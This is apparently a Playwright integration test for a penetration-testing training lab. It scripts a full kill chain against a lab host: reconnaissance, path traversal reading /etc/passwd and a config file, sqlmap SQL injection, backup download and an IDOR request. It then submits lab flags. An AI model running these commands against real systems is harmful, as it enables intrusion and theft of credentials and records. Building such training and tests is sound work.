import { test, expect } from '@playwright/test';

test.describe('Parallax SC-01 Full Kill Chain Integration Test', () => {
  test('Complete SC-01 pentest kill chain and verify all 4 flags', async ({ page }) => {
    test.setTimeout(120_000); // Enforce 2 minutes timeout for the full chain

    // Monitor console and websocket frames
    page.on('console', msg => console.log(`BROWSER: ${msg.text()}`));
    page.on('websocket', ws => {
      ws.on('framesent', event => console.log(`WS SEND: ${event.payload}`));
      ws.on('framereceived', event => console.log(`WS RECV: ${event.payload}`));
    });

    // 1. Register a new user
    const username = 'killchain_' + Date.now();
    await page.goto('http://localhost:3000/auth');
    await page.click('button:has-text("Register")');
    await page.fill('input[type="text"]', username);
    await page.fill('input[type="password"]', 'testpass123');
    await page.click('button[type="submit"]');

    // Handle onboarding
    await expect(page).toHaveURL(/.*\/onboarding/, { timeout: 10_000 });
    await page.click('h3:has-text("Experienced")');
    await page.click('button:has-text("INITIALIZE NEURAL LINK")');
    await expect(page).toHaveURL(/.*\/dashboard/, { timeout: 10_000 });

    // 2. Start SC-01 Red session
    await page.click('text=SC-01');
    await page.click('button:has-text("Start mission")');
    
    // Acknowledge Rules of Engagement
    await expect(page.locator('text=Rules of Engagement').first()).toBeVisible({ timeout: 15_000 });
    await page.check('input[type="checkbox"]');
    await page.click('button:has-text("Acknowledge")');

    // Wait for terminal screen
    const terminal = page.locator('.xterm-screen').first();
    await expect(terminal).toBeVisible({ timeout: 15_000 });
    await expect(page.locator('.xterm-rows')).toContainText('student@kali', { timeout: 30_000 });

    // Monitor HTTP flag requests
    page.on('request', req => {
      if (req.url().includes('/flag')) {
        console.log(`HTTP REQ: ${req.method()} ${req.url()} | POST DATA: ${req.postData()}`);
      }
    });
    page.on('response', res => {
      if (res.url().includes('/flag')) {
        res.text().then(text => {
          console.log(`HTTP RES: ${res.status()} ${res.url()} | BODY: ${text}`);
        }).catch(err => {
          console.log(`HTTP RES: ${res.status()} ${res.url()} | error reading body: ${err}`);
        });
      }
    });

    // Helper: Execute a command in terminal
    const executeCommand = async (command: string) => {
      await terminal.click();
      await page.keyboard.type(command, { delay: 50 });
      await page.keyboard.press('Enter');
      await page.waitForTimeout(4000); // Wait for output
    };

    // Helper: Submit flag in UI
    const submitFlag = async (value: string) => {
      console.log(`[E2E] submitFlag called with: "${value}"`);
      await page.click('button:has-text("SUBMIT FLAG")');
      await page.waitForTimeout(1000);
      await page.fill('input[placeholder*="FLAG"]', value);
      await page.waitForTimeout(1000);
      await page.click('form button[type="submit"]');
      await page.waitForTimeout(3000);
    };

    // 3. Phase 1: Passive Reconnaissance
    await executeCommand('whatweb http://172.20.1.20');
    await executeCommand('curl http://172.20.1.20/robots.txt');

    // Save finding note (Required for Phase 1 completion)
    await page.locator('button:has-text("#finding")').first().click();
    await page.fill('textarea[placeholder*="save"]', 'Passive recon completed. Apache 2.4.54 and robots.txt paths analyzed.');
    await page.click('button:has-text("Save")');
    await page.waitForTimeout(3000);

    // 4. Phase 2: Active Enumeration
    await executeCommand('gobuster dir -u http://172.20.1.20 -w /usr/share/wordlists/dirb/common.txt -t 30');

    // Save second finding note (Required for Phase 2 completion)
    await page.locator('button:has-text("#finding")').first().click();
    await page.fill('textarea[placeholder*="save"]', 'Gobuster identified endpoints: /login, /records, /backup, /uploads, /admin.');
    await page.click('button:has-text("Save")');
    await page.waitForTimeout(3000);

    // 5. Phase 3: Vulnerability Identification (LFI / SQLi / IDOR)
    // Run LFI to get FLAG-SC01-1
    await executeCommand("curl 'http://172.20.1.20/records?file=../../../../etc/passwd'");
    await submitFlag('LFI confirmed: root:x:0:0');

    // Run SQLi
    await executeCommand("sqlmap -u 'http://172.20.1.20/login' --data='username=admin&password=test' --level=2 --risk=1 --dbs");

    // Fetch DB Backup
    await executeCommand("curl http://172.20.1.20/backup/db_backup.sql.gz -o /tmp/backup.sql.gz");
    await submitFlag('P@ssw0rd_NovaMed_2023!');

    // Test IDOR
    await executeCommand("curl http://172.20.1.20/api/v1/patients/1042");
    await submitFlag('Patient 1042: Aisha Rahman');

    // Chain LFI to get FLAG-SC01-3
    await executeCommand("curl 'http://172.20.1.20/records?file=../../../../var/www/html/admin/config.php'");
    await submitFlag('DB_PASS=WebAppPass2024!');

    // 6. Assertions
    // Check that we captured 4 flags
    const flagIndicator = page.locator('button:has-text("captured")').first();
    await expect(flagIndicator).toContainText(/4\/4/);

    // Check SIEM panel alert badge existence
    const siemFeed = page.locator('[data-testid="siem-event"], .group.relative.overflow-hidden.rounded-cs-sm').first();
    await expect(siemFeed).toBeVisible({ timeout: 10_000 });

    // Check target IP scenario display matches real IP
    const topBarChip = page.locator('span:has-text("SC-01")').first();
    await expect(topBarChip).toContainText(/SC-01/);
  });
});
